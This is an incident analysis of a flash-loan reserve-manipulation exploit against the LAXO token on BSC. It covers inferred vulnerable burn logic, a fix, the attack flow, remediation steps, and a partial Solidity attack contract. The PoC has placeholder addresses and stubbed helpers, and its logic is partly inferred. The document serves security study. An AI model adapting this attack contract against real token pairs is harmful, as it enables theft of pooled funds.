# LAXO Token — Reserve Manipulation via Incorrect Burn Logic Analysis

| Field | Details |
|------|------|
| **Date** | 2026-02-22 |
| **Protocol** | LAXO Token |
| **Chain** | BSC |
| **Loss** | ~$137,000 |
| **Attacker** | [0x17f9132E66A78b93195b4B186702Ad18Fdcd6E3D](https://bscscan.com/address/0x17f9132E66A78b93195b4B186702Ad18Fdcd6E3D) |
| **Attack Contract** | [0x6588ACB7dd37887C707C08AC710A82c9F9A7C1E9](https://bscscan.com/address/0x6588ACB7dd37887C707C08AC710A82c9F9A7C1E9) |
| **Attack Tx** | [0xd58f3ef6...ac7d3](https://bscscan.com/tx/0xd58f3ef6414b59f95f55dae1acb3d5d6e626acf5333917c6d43fe422d98ac7d3) |
| **Vulnerable Contract** | [0x62951CaD7659393BF07fbe790cF898A3B6d317CB](https://bscscan.com/address/0x62951CaD7659393BF07fbe790cF898A3B6d317CB) |
| **Root Cause** | Incorrect burn logic during transfer causes the pair contract balance to double, enabling reserve manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

The LAXO Token contract includes logic to burn a portion of tokens on transfer. However, due to an implementation error in the burn logic, transferring tokens to a pair contract (DEX LP) causes the pair's actual balance (`balanceOf`) to become significantly larger than the pair's internal reserve (`reserve`).

The attacker exploited this via the following sequence:

1. Flash loan BUSD from PancakeV3
2. Purchase LAXO tokens with BUSD
3. Manipulate pair state by adding/removing liquidity
4. Directly transfer LAXO to the pair contract → burn bug artificially inflates pair balance
5. Call `sync()` to update reserves to match actual balance
6. Extract BUSD via swap based on manipulated reserves
7. Repay flash loan and collect profit

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (inferred)

```solidity
// ❌ Vulnerable: incorrect burn logic during transfer
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 burnAmount = amount * burnFee / 100;

    // ❌ Problem: when transferring to pair, adds the full amount to
    //         the recipient's balance without deducting burnAmount,
    //         then separately transfers burnAmount from the sender
    super._transfer(from, to, amount);         // adds full amount to pair
    super._transfer(from, burnAddress, burnAmount); // additional deduction from sender
    // Result: pair.balance = original + amount (no burn deduction)
    //         from.balance = original - amount - burnAmount (double deduction)
}
```

### Fixed Code

```solidity
// ✅ Fixed: transfer only the net amount after deducting the burn portion
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 burnAmount = amount * burnFee / 100;
    uint256 netAmount = amount - burnAmount;

    // ✅ Only the net amount excluding the burn portion is sent to the pair
    super._transfer(from, to, netAmount);
    // ✅ Burn is handled based on the net amount already processed from total amount
    if (burnAmount > 0) {
        super._transfer(from, burnAddress, burnAmount);
    }
    // Result: pair.balance += netAmount (correct)
    //         from.balance -= amount (correct)
}
```

---

## 3. Attack Flow

```
Attacker (0x17f9...6E3D)
  │
  ├─[1] PancakeSwap V3 flash loan: borrow large amount of BUSD
  │
  ├─[2] Swap BUSD → LAXO (buy from pair)
  │       pair.reserve_BUSD ↑, pair.reserve_LAXO ↓
  │
  ├─[3] Add liquidity (addLiquidity)
  │       Receive LP tokens
  │
  ├─[4] Remove liquidity (removeLiquidity)
  │       Receive LAXO + BUSD back
  │
  ├─[5] Attacker → direct transfer of LAXO to pair
  │       ⚠️  Burn bug triggered:
  │       pair.balanceOf += amount (full amount)
  │       attacker.balanceOf -= amount + burnAmount
  │       pair's actual balance >> pair's internal reserve
  │
  ├─[6] Call pair.sync()
  │       Force-sync reserve = balanceOf
  │       reserve_LAXO spikes → BUSD/LAXO price distorted
  │
  ├─[7] Swap LAXO → BUSD
  │       Extract large amount of BUSD based on manipulated reserve
  │
  └─[8] Repay PancakeSwap V3 flash loan
        Net profit: ~$137,000
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
    function skim(address to) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract LaxoAttack {
    address constant LAXO = 0x62951CaD7659393BF07fbe790cF898A3B6d317CB;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant LAXO_PAIR = 0x...; // LAXO/BUSD pair
    IPancakeV3Pool constant pancakeV3 = IPancakeV3Pool(0x...);

    function attack() external {
        // [1] Borrow BUSD via PancakeV3 flash loan
        pancakeV3.flash(address(this), 0, 500_000e18, abi.encode("attack"));
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        uint256 busdBalance = IERC20(BUSD).balanceOf(address(this));

        // [2] Buy LAXO with BUSD
        IERC20(BUSD).transfer(LAXO_PAIR, busdBalance / 2);
        IUniswapV2Pair(LAXO_PAIR).swap(
            _getLaxoOut(busdBalance / 2), 0, address(this), ""
        );

        uint256 laxoBalance = IERC20(LAXO).balanceOf(address(this));

        // [5] Direct transfer of LAXO to pair → burn bug inflates pair balance
        // burnAmount is not deducted from pair inside transfer
        IERC20(LAXO).transfer(LAXO_PAIR, laxoBalance);

        // [6] Use sync() to align reserve with manipulated balance
        IUniswapV2Pair(LAXO_PAIR).sync();

        // [7] Extract BUSD using manipulated reserve
        (uint112 r0, uint112 r1,) = IUniswapV2Pair(LAXO_PAIR).getReserves();
        uint256 busdOut = _getAmountOut(laxoBalance, r0, r1);
        IUniswapV2Pair(LAXO_PAIR).swap(0, busdOut, address(this), "");

        // [8] Repay flash loan
        uint256 repay = busdBalance + fee1;
        IERC20(BUSD).transfer(msg.sender, repay);
    }

    function _getLaxoOut(uint256 amountIn) internal view returns (uint256) { /* ... */ }
    function _getAmountOut(uint256 amountIn, uint112 r0, uint112 r1) internal pure returns (uint256) { /* ... */ }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Incorrect Burn Logic |
| **Attack Vector** | Flash Loan + DEX Reserve Manipulation |
| **Impact Scope** | Entire LAXO/BUSD AMM pair |
| **DASP Classification** | Business Logic Error |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |

### Detailed Description

LAXO's `_transfer()` function was structured to deliver the full `amount` to the recipient, then additionally deduct `burnAmount` from the sender. As a result, the recipient's (pair's) balance was increased by the full amount including the burn portion, causing the DEX pair's `balanceOf` to remain consistently larger than its internal `reserve`.

The attacker reflected this discrepancy into the reserve via `sync()` to distort the price, then extracted profit through this manipulation.

---

## 6. Remediation Recommendations

1. **Fix burn logic**: The amount delivered to the recipient inside `_transfer` must be strictly limited to `amount - burnAmount`
2. **Pair address exception handling**: Do not apply burn logic when transferring to DEX pair addresses, or handle them separately
3. **Strengthen unit tests**: For tokens with burns, verify that the change in pair balance matches expectations
4. **Restrict `sync()` access**: Add access control so that only trusted addresses can call it
5. **Audit checklist**: Custom `_transfer` logic must always be included as an independent audit item

---

## 7. Lessons Learned

- **Custom transfer logic can conflict with DEX**: AMMs are designed under the assumption of consistency between `balanceOf` and `reserve`; any non-standard transfer logic that breaks this assumption becomes a critical vulnerability.
- **Burn tokens must handle pair exceptions separately**: Pair contracts must be treated differently from regular users, and burn logic must be designed so it does not distort the pair's reserves.
- **`sync()` and `skim()` are dangerous tools**: A publicly callable `sync()` becomes an attack vector in environments where balance manipulation is possible.
- **Audits must include flash loan simulation**: Static analysis alone is insufficient to detect such dynamic manipulation patterns; attack simulation in a forked environment is the most effective approach.